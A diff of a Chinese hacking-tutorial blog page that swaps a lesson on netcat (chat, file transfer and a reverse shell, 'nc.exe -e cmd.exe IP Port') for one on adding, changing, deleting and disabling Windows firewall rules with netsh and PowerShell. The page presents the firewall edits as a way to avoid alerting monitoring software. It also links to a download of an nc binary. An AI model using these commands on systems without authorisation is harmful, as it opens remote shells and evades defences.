@@ -40,7 +40,7 @@
 	<meta name="description" content="HackMM,我们的征途,是星辰大海.">
 	<meta name="author" content="HackMM.COM-月刃">
 	<meta name="keywords" content="hackmm,HackMM,月刃,hackmm.com,Hack萌妹,黑客萌妹,黑客技术,黑客学习,Windows技术,Linux技术,Archlinux,Linux软件,漏洞挖掘,网络安全,渗透测试,自动化办公,python全自动办公,Windows系统激活,新手学电脑,IT技术,Rust,Rust编程,黑客技术,黑客,红客,honker,hack,hacker">
-	<title>[Win基础]-6-实战用三个nc实验理解防火墙策略 - HackMM.COM - 黑客萌妹</title>
+	<title>[Win基础]-7-Windows下命令行修改防火墙策略 - HackMM.COM - 黑客萌妹</title>
 	<link rel="shortcut icon" type="image/x-icon" href="../logo/favicon.png">
 	<link rel="stylesheet" type="text/css" href="../css/basic.css">
 	<link rel="stylesheet" type="text/css" href="../css/text.css">
@@ -90,59 +90,98 @@
 			<!-- 文章区 -->
 			<article class="text-container">
 				<header class="text-header">
-					<h1>[Win基础]-6-实战用三个nc实验理解防火墙策略</h1>	
+					<h1>[Win基础]-7-Windows下命令行修改防火墙策略</h1>	
 				</header>
 				<section class="text-body">
 					<h2>引言</h2>
-					<p>这篇文章通过一个模拟实战，利用nc这个工具，来理解防火墙出站入站策略对访问数据的影响。</p>
+					<p>这篇文章来看一下如何通过命令行控制Windows自带的防火墙，有时候我们为了不引起监控软件的注意，需要尽可能少的去做防火墙开关等操作，那么在拥有权限的前提下，往防火墙中添加策略就是一种比较好的选择。</p>
 					<!-- 目录 -->
 					<h2>文章目录</h2>
 					<ul class="contents">	
-						 <li><a href="#windows-firewall-1">0×1.视频中用到的nc命令解析</a></li>
-						 <li><a href="#windows-firewall-2">0×2.nc实验理解防火墙策略视频演示</a></li>
+						 <li><a href="#windows-firewall-1">0×1.视频中用到的防火墙命令解析</a></li>
+						 <li><a href="#windows-firewall-2">0×2.Windows下命令行修改防火墙策略视频演示</a></li>
 					 </ul>
 					<!-- /目录 -->
 
 					<!-- 正文 -->
-					<h2 id="windows-firewall-1">0×1.视频中用到的nc命令解析</h2>
+					<h2 id="windows-firewall-1">0×1.视频中用到的防火墙命令解析</h2>
 
-					<p>首先，来看看nc是什么，根据诸多文档的描述，nc是一款功能强大的网络工具，在网络工具中有“瑞士军刀”美誉，并且有Windows和Linux两个版本。因为它短小精悍，功能实用，被设计为一个简单、可靠的网络工具，可通过TCP或UDP协议传输读写数据。同时，它还是一个网络应用Debug分析器，因为它可以根据需要创建各种不同类型的网络连接。</p>
-					<p>在渗透测试中，nc多用来作为反弹shell的接收端，就是因为如此，nc在诸多杀毒软件中，都会被当做病毒查杀。</p>
+					<p>Windows防火墙从WindowsXP时代就已经默认存在windows系统中，Windows Defender防火墙有助于防止黑客和恶意软件通过 Internet 或网络访问你的电脑。在个人用的版本中（WinXP-Win11-WinN），默认在执行一个需要访问网络的程序时，系统防火墙会自动询问是否放行程序，如果选择放行，那么就会将程序添加到防火墙入站策略中，并且允许程序所有端口的访问，在服务器版的Windows中（Win2000-Win2022-WinNNNN），则需要手动去添加入站和出站规则，否则默认是禁止访问。</p>
 
 					<p>视频中用到的命令：</p>
 					<pre class='line-numbers' data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！' >
 					<code class="lang-powershell">
-					#下面代码中1234为演示用的端口号，可以自定义，IP替换为服务器的IP地址，Port替换为服务器的端口号，例如：本列中如果监听端用1234，那么Port就替换成1234，与监听端一致即可
-					# 1.nc聊天：
-					//被动端监听
-					C:\Windows\System32&gt; nc.exe -lvvp 1234
-					//主动端连接 
-					C:\Windows\System32&gt; cn.exe IP Port
+					# CMD控制防火墙命令
 
-					# 2.nc传输文件：
-					//监听的方式接收文件
-					C:\Windows\System32&gt; nc.exe -lvvp 1234 &gt; filename
-					//主动端发送文件到对端监听的端口
-					C:\Windows\System32&gt; nc.exe IP Port &lt; filename
+					# 1.添加端口入站允许规则
+					//添加规则，固定前缀：netsh advfirewall firewall add rule
+					//name="规则名称"
+					//dir=方向 ， dir=in|out
+					//协议 protocol=icmpv4|icmpv6|tcp|udp|any (default=any) 
+					//允许访问的本地端口 localport=0-65535  (default=any)
+					//是否允许访问 action=allow|block|bypass
+					//作用域 profile=public|private|domain|any
+					//规则是否启用 enable=yes|no (default=yes)
+					//终上所述，这条命令就是创建一个名称为"1234"，协议为TCP，端口为1234，允许在所有区域都能访问的策略，并且策略是启用状态
+					C:\Windows\System32&gt; netsh advfirewall firewall add rule name="1234" dir=in protocol=TCP localport=1234 action=allow profile=any enable=yes
 
-					//监听的方式发送文件
-					C:\Windows\System32&gt; nc.exe -lvvp 1234 &lt; filename
-					//直接去目标服务器取文件
-					C:\Windows\System32&gt; nc.exe IP Port &gt; filename
-					
-					# 3.nc反弹shell：（重点）
-					//监听端：
-					C:\Windows\System32&gt; nc.exe -lvvp 1234
-					//反弹端：
-					C:\Windows\System32&gt; nc.exe -e cmd.exe IP Port
+					# 2.添加只允许某个IP或者IP段的入站规则
+					//默认不携带，就是所有段都能访问 remoteip=any （default）
+					//IP段支持下面三种写法：
+					//remoteip=192.168.80.233
+					//remoteip=192.168.80.0/24
+					//remoteip=192.168.80.1-192.168.80.255
+					//本地段同样如此：
+					//localip=any （default）
+					//localip=192.168.80.123
+					//localip=192.168.80.0/24
+					//localip=192.168.80.1-192.168.80.255
+					C:\Windows\System32&gt; netsh advfirewall firewall add rule name="1234" dir=in protocol=TCP localport=1234 remoteip=192.168.80.233 action=allow profile=any enable=yes
+
+					# 3.禁止nc程序的出站规则
+					//其中program=后面是需要禁止的程序的绝对路径
+					C:\Windows\System32&gt; netsh advfirewall firewall add rule name="NC禁止联网-出站" dir=out action=block profile=any program="C:\Users\Administrator\Desktop\nc.exe" enable=yes
+
+					#规则总结：
+					#当规则发生冲突时的规则优先级：禁止>允许 --> 精确>不精确
+
+					# 4.查看某个规则名称下配置的详细的规则参数
+					//用于查询的防火墙命令固定前缀：netsh advfirewall firewall show rule
+					C:\Windows\System32&gt; netsh advfirewall firewall show rule name="远程桌面 - 用户模式(UDP-In)"
+
+					# 5.用set更新防火墙策略
+					//用于更新防火墙策略的命令固定前缀：netsh advfirewall firewall set rule name="策略名称" new
+					//将更新名称为1234的策略的端口、远程地址，并且将访问策略设置成阻止，也就是禁止访问
+					C:\Windows\System32&gt; netsh advfirewall firewall set rule name="1234" new localport=2333 remoteip=192.168.0.2 action=block
+
+					# 6.用delete删除防火墙策略
+					//防火墙删除命令固定前缀：netsh advfirewall firewall delete rule 
+					//删除名字任意，但协议为tcp并且本地端口是1234的策略
+					C:\Windows\System32&gt; netsh advfirewall firewall delete rule name=all protocol=tcp localport=1234
+
+					//删除名称都为 "1234" 的规则:
+					C:\Windows\System32&gt; netsh advfirewall firewall delete rule name="1234"
+
+
+					# 7.管理员权限，开关防火墙：
+					//使用powershell命令开启防火墙
+					PS C:\Windows\System32&gt; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
+					//使用powershell命令关闭防火墙
+					PS C:\Windows\System32&gt; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+					//使用cmd命令，开启防火墙
+					C:\Windows\System32&gt; netsh advfirewall set allprofiles state on
+					//使用cmd命令，关闭防火墙
+					C:\Windows\System32&gt; netsh advfirewall set allprofiles state off
 					</code>
 					</pre>
 
-					<h2 id="windows-firewall-2">0×2.nc实验理解防火墙策略视频演示</h2>
-	
+					<h2 id="windows-firewall-2">0×2.Windows下命令行修改防火墙策略视频演示</h2>
+
 					<p>点击下方视频标题，可以进入B站观看高清版本</p>
-					<p>【第10天】Windows基础-10-实战用三个nc实验理解防火墙策略-windows防火墙入站出站搞不清？开始炫~大一女新生挑战一年精通网络安全-信息安全-计算机安全-计算机技术-黑客技术-渗透测试，我无所畏惧</p>
-					<iframe src="//player.bilibili.com/player.html?aid=278880001&bvid=BV19w411P7Z4&cid=1344777440&p=1&autoplay=0" allowfullscreen="allowfullscreen" width="100%" height="500" scrolling="no" frameborder="0" > </iframe>
+					<p>【第11天】Windows基础-11-Windows下用命令行添加修改防火墙出站入站策略~开始炫~大一女新生挑战一年精通网络安全-信息安全-计算机安全-计算机技术-黑客技术-渗透测试，我无所畏惧</p>
+					<iframe src="//player.bilibili.com/player.html?aid=493984417&bvid=BV15N41177ej&cid=1347213962&p=1&autoplay=0" allowfullscreen="allowfullscreen" width="100%" height="500" scrolling="no" frameborder="0" > </iframe>
+
 					<p>视频中用到的「nc」来自UC网盘分享：</p> 
 					<p>*「nc工具-windows版64位」:<a title="nc工具-windows版64位" style="color: rgb(4,181,150);" href="https://drive.uc.cn/s/dc10ff617ae54" target="_blank">点击打开</a> 密码：wSZU</p>
 
@@ -154,7 +193,7 @@
 					<p>
 						*转载请注明来自:<a title="HackMM.COM" style="color: rgb(4,181,150);" href="https://www.HackMM.com" target="_blank">HackMM.COM</a>
 					</p>
-					<p>*原文连接:<a title="[Win基础]-6-实战用三个nc实验理解防火墙策略" style="color: rgb(4,181,150);" href="https://www.HackMM.com/mm/windows-base-6.html" target="_blank">https://www.HackMM.com/mm/windows-base-6.html</a></p>
+					<p>*原文连接:<a title="[Win基础]-7-Windows下命令行修改防火墙策略" style="color: rgb(4,181,150);" href="https://www.HackMM.com/mm/windows-base-7.html" target="_blank">https://www.HackMM.com/mm/windows-base-7.html</a></p>
 				</footer>
 			</article>
 			<!-- /文章区 -->	
